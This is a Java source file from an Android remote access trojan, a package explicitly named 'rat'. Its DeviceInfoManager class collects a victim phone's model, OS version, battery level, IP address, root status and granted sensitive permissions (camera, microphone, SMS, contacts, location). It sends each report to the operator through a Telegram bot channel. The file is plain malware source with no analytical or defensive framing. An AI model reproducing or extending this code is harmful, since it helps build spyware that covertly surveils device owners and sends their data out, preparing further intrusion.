package com.enterprise.rat.commands;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.BatteryManager;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.enterprise.rat.utils.NetworkUtils;

public class DeviceInfoManager {
    private Context context;

    public DeviceInfoManager(Context context) { this.context = context; }

    public void sendDeviceInfo() {
        BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        int batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        StringBuilder sb = new StringBuilder();
        sb.append("<b>📱 Device Information</b>\n");
        sb.append("<b>Session ID:</b> <code>").append(BotConfig.SESSION_ID).append("</code>\n");
        sb.append("<b>Model:</b> ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        sb.append("<b>Android:</b> ").append(Build.VERSION.RELEASE).append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
        sb.append("<b>Battery:</b> ").append(batteryLevel).append("%\n");
        sb.append("<b>IP:</b> <code>").append(NetworkUtils.getIPAddress(true)).append("</code>\n");
        sb.append("<b>Root:</b> ").append(isDeviceRooted() ? "✅" : "❌").append("\n");
        TelegramApi.sendMessage(sb.toString());
    }

    public void sendBatteryStatus() {
        BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        TelegramApi.sendMessage("🔋 <b>Battery:</b> " + level + "%");
    }

    public void sendNetworkInfo() {
        TelegramApi.sendMessage("<b>IP:</b> " + NetworkUtils.getIPAddress(true));
    }

    public void sendPermissions() {
        StringBuilder sb = new StringBuilder("<b>🔐 Permissions:</b>\n");
        String[] perms = {"INTERNET","CAMERA","RECORD_AUDIO","READ_SMS","READ_CONTACTS","ACCESS_FINE_LOCATION"};
        for (String p : perms) {
            int res = context.checkSelfPermission("android.permission." + p);
            sb.append(res == PackageManager.PERMISSION_GRANTED ? "✅" : "❌").append(" ").append(p).append("\n");
        }
        TelegramApi.sendMessage(sb.toString());
    }

    private boolean isDeviceRooted() {
        for (String path : new String[]{"/system/app/Superuser.apk","/sbin/su","/system/bin/su","/system/xbin/su"})
            if (new java.io.File(path).exists()) return true;
        return false;
    }
}
